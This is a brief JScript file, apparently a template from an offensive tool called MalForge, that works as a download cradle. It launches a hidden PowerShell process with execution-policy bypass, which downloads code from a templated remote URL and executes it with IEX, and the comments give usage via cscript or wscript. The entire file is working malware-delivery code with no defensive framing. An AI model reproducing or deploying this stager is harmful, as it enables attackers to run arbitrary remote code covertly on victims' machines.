// MalForge -- JScript download cradle
// Fetches payload from remote server and executes via PowerShell
// Usage: cscript payload.js  OR  wscript payload.js

var url = "{{ payload_url }}";
var sh = new ActiveXObject("WScript.Shell");
var cmd = "powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"";
sh.Run(cmd, 0, false);
